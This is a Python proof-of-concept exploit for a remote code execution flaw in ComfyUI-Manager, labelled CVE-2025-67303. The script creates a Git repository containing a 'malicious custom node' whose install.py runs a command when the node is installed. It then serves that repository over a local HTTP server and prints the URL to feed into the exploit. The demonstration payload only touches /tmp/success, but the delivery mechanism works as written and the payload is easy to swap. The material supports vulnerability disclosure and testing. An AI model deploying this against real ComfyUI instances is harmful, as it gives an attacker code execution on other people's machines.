#!/usr/bin/env python3
"""
CVE-2025-67303 PoC - Local Git HTTP Server for ComfyUI-Manager RCE

This script starts a local Git HTTP server hosting a malicious custom node.
When the malicious node is installed via ComfyUI-Manager, it executes
`touch /tmp/success` to demonstrate remote code execution.

Usage:
    python poc.py [port]

    Default port is 9999. The malicious repository will be available at:
    http://your-ip:9999/evil-node-<random>
"""

import functools
import http.server
import os
import random
import shutil
import stat
import string
import subprocess
import sys
import tempfile


def remove_readonly(func, path, excinfo):
    """Error handler for shutil.rmtree to handle read-only files on Windows."""
    os.chmod(path, stat.S_IWRITE)
    func(path)


EVIL_NODE_CODE = '''
import subprocess
subprocess.run(["touch", "/tmp/success"])

NODE_CLASS_MAPPINGS = {}
'''


def create_git_repo(base_dir):
    """Create a bare Git repository with malicious custom node code."""
    random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    repo_name = f"evil-node-{random_suffix}"
    
    src_path = os.path.join(base_dir, "src")
    bare_path = os.path.join(base_dir, repo_name)
    
    os.makedirs(src_path, exist_ok=True)
    
    # Create __init__.py with malicious code
    init_file = os.path.join(src_path, "__init__.py")
    with open(init_file, "w", encoding="utf-8") as f:
        f.write('# This is a malicious custom node')

    # Create install.py with malicious code
    install_file = os.path.join(src_path, "install.py")
    with open(install_file, "w", encoding="utf-8") as f:
        f.write(EVIL_NODE_CODE)
    
    # Initialize Git repository and commit
    subprocess.run(["git", "init"], cwd=src_path, check=True, 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["git", "config", "user.email", "test@test.com"], cwd=src_path, check=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["git", "config", "user.name", "test"], cwd=src_path, check=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["git", "add", "."], cwd=src_path, check=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["git", "commit", "-m", "evil node"], cwd=src_path, check=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Clone as bare repository for dumb HTTP protocol
    subprocess.run(["git", "clone", "--bare", src_path, bare_path], check=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Enable dumb HTTP protocol
    subprocess.run(["git", "update-server-info"], cwd=bare_path, check=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Cleanup source repository
    shutil.rmtree(src_path, onerror=remove_readonly)
    
    return repo_name


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 9999

    with tempfile.TemporaryDirectory(prefix="comfyui-poc-") as temp_dir:
        print(f"[*] Creating malicious Git repository...")
        repo_name = create_git_repo(temp_dir)
        
        print(f"[+] Git HTTP server starting on port {port}")
        print(f"[+] Malicious repository URL: http://your-ip:{port}/{repo_name}")
        print(f"")
        print(f"[*] Use this URL in the exploit:")
        print(f'    {{"url": "http://your-ip:{port}/{repo_name}"}}')
        print(f"")
        print(f"[*] Press Ctrl+C to stop the server")
        print(f"")
        
        # Create handler with specified directory
        handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=temp_dir)
        
        with http.server.HTTPServer(("0.0.0.0", port), handler) as httpd:
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                print("\n[*] Server stopped")


if __name__ == "__main__":
    main()
